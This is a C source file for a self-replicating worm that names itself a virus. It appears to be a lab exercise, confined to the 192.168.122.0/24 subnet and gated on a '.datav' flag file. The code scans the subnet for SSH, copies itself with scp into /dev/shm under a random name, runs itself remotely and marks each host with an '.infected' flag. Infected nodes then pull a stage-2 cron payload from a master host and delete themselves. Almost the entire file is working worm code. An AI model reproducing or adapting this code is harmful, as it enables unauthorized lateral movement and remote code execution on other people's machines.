#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/types.h>

#define FILENAME_SIZE 30
#define BUFFER_SIZE 256
#define SOCKET_TIMEOUT 1
#define VIRUS_WOKRING_DIR "/dev/shm"
#define MASTER_WORKING_DIR "/tmp/virus"
#define STAGE_2_PAYLOAD "admin.cronjob"
#define ALLOWED_FLAG ".datav"
#define INFECTED_FLAG ".infected"


void generate_random_string(char *str) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    const size_t charset_size = sizeof(charset) - 1;
    memset(str, 0x0, FILENAME_SIZE);
    for (int i = 0; i < FILENAME_SIZE-1; i++) {
        str[i] = charset[rand() % charset_size];
    }
}

void generate_random_seed(char *seed) {
    FILE *dev_urandom_fd = fopen("/dev/urandom", "r");
    if(dev_urandom_fd != NULL) {
        *seed = getc(dev_urandom_fd);
    }
}

// check if remote host is authorized to be infected
bool is_authorized(char *ip) {
    char cmd_buffer[256];
    snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s stat %s/%s > /dev/null 2>&1", ip, VIRUS_WOKRING_DIR, ALLOWED_FLAG);
    if(system(cmd_buffer) == 0) {
        return true;
    } else {
        return false;
    }
}

// check if remote host is already infected
bool is_infected(char *ip) {
    char cmd_buffer[256];
    snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s stat %s/%s > /dev/null 2>&1", ip, VIRUS_WOKRING_DIR, INFECTED_FLAG);
    if(system(cmd_buffer) == 0) {
        return true;
    } else {
        return false;
    }
}

// check if the local machine has the given ip addr
bool is_master_node(const char *ip) {
    struct ifaddrs *ifaddr, *ifa;
    bool has_ip = false;

    // get all net ifaces
    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return false;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) {
            continue;
        }
        // for all ipv4 addresses
        if (ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
            char addr_buf[INET_ADDRSTRLEN];
            // get ip as string
            if (!inet_ntop(AF_INET, &sa->sin_addr, addr_buf, sizeof(addr_buf))) {
                perror("inet_ntop");
                continue;
            }
            // compare to specified ip
            if (strcmp(addr_buf, ip) == 0) {
                has_ip = true;
                break;
            }
        }
    }
    freeifaddrs(ifaddr);
    return has_ip;
}

// upload virus on remote target, execute payload and flag it as infected
int replicate_to_host(char *virus_name, char *target_ip_buff) {
    char cmd_buffer[BUFFER_SIZE],
        rnd_name_buffer[FILENAME_SIZE];
    // drop virus in tmpfs
    generate_random_string(rnd_name_buffer);
    snprintf(cmd_buffer, sizeof(cmd_buffer), "scp %s debian@%s:%s/%s > /dev/null 2>&1", virus_name, target_ip_buff, VIRUS_WOKRING_DIR, rnd_name_buffer);
    if(system(cmd_buffer) == 0) {
        // add infected flag
        snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s touch %s/%s > /dev/null 2>&1", target_ip_buff, VIRUS_WOKRING_DIR, INFECTED_FLAG);
        system(cmd_buffer);
        // exec payload on target host
        snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s %s/%s > /dev/null 2>&1", target_ip_buff, VIRUS_WOKRING_DIR, rnd_name_buffer);
        return system(cmd_buffer);
    } else {
        return -1;
    }
}

// fetch the stage 2 payload from master node (actually a simple cronjob script)
void execute_stage_1(char *master_ip) {
    char cmd_buffer[BUFFER_SIZE];
    snprintf(cmd_buffer, sizeof(cmd_buffer), "scp lucas@%s:%s/%s %s", master_ip, MASTER_WORKING_DIR, STAGE_2_PAYLOAD, VIRUS_WOKRING_DIR);
    system(cmd_buffer);
}

// self destroy
void self_delete(char *program_name) {
    remove(program_name);
    exit(EXIT_SUCCESS);
}

int main(int argc, char **argv) {
    char base_ip_range[]    = "192.168.122.",
        master_ip[]         = "192.168.122.1";
    int port        = 22,
        first_host  = 2,
        last_host   = 254;
    char seed;
    
    // get main seed from reading 1 byte of urandom
    generate_random_seed(&seed);

    // start ip range scan
    for (int i = first_host; i <= last_host; i++) {
        pid_t pid = fork();

        if (pid < 0) {
            perror("fork() failed");
            exit(EXIT_FAILURE);
        }

        // in child process
        if (pid == 0) {
            // generate prng from child specific seed
            srand(seed ^ (getpid()<<16));

            int sock;
            char target_ip_buff[32];
            struct sockaddr_in server_addr;
            struct timeval timeout;

            // build target IP
            snprintf(target_ip_buff, sizeof(target_ip_buff), "%s%d", base_ip_range, i);

            if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
                perror("socket() failed");
                exit(EXIT_FAILURE);
            }

            // set timeout to close socket after X seconds without response
            timeout.tv_sec = SOCKET_TIMEOUT;
            timeout.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*) &timeout, sizeof(timeout));
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*) &timeout, sizeof(timeout));
            
            // build server_addr struct from string representation
            memset(&server_addr, 0, sizeof(server_addr));
            server_addr.sin_family = AF_INET;
            server_addr.sin_port   = htons(port);
            if (inet_pton(AF_INET, target_ip_buff, &server_addr.sin_addr) <= 0) {
                perror("inet_pton() failed");
                close(sock);
                exit(EXIT_FAILURE);
            }

            // try socket connection
            if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
                // replicate to others nodes if both authorized an not already infected
                if(is_authorized(target_ip_buff) && !is_infected(target_ip_buff)) {
                    replicate_to_host(argv[0], target_ip_buff);
                }
            }
            close(sock);
            exit(EXIT_SUCCESS);
        }
    }

    // wait all childs processus
    for (int i = first_host; i <= last_host; i++) {
        wait(NULL);
    }

    // FOR CLIENT NODES ONLY : execute payload locally
    if(!is_master_node(master_ip)) {
        execute_stage_1(master_ip);
        self_delete(argv[0]);
    }

    return 0;
}
